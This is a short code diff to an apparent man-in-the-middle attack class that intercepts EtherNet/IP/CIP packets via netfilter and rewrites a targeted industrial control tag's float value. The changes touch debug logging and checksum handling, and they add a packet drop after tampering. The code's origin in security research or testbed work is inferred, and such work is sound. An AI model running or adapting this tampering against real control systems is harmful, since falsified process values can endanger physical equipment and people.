@@ -33,7 +33,6 @@ class MiTMNetfilterQueue(PacketQueue):
             p = IP(packet.get_payload())
 
             #self.logger.debug('packet')
-            #self.logger.debug(p.show())
             if 'ENIP_TCP' in p:
                 if 'ENIP_SendRRData' in p:
                     if 'CIP_ReqConnectionManager' in p:
@@ -44,6 +43,7 @@ class MiTMNetfilterQueue(PacketQueue):
                         if self.attacked_tag == tag_name:
                             self.logger.debug('Modifying tag: ' + str(tag_name))
                             self.session_id = p['ENIP_TCP'].session
+                            #self.logger.debug(p.show())
 
                     else:
                         this_session = p['ENIP_TCP'].session
@@ -51,6 +51,7 @@ class MiTMNetfilterQueue(PacketQueue):
                             value = translate_payload_to_float(p[Raw].load)
                             self.logger.debug('tag value is:' + str(value))
                             self.logger.debug('Tag ' + self.attacked_tag + ' is going to be modified')
+                            #self.logger.debug(p.show())
 
                             if 'value' in self.intermediate_attack.keys():
                                 p[Raw].load = translate_float_to_payload(
@@ -63,10 +64,14 @@ class MiTMNetfilterQueue(PacketQueue):
                             self.logger.debug \
                                 ('New payload tag value is: ' + str(translate_payload_to_float(p[Raw].load)))
 
+                            del p[IP].chksum
                             del p[TCP].chksum
 
                             packet.set_payload(bytes(p))
                             self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
+                            #self.logger.debug(p.show())
+                            packet.drop()
+                            return
 
             packet.accept()
         except Exception as exc:
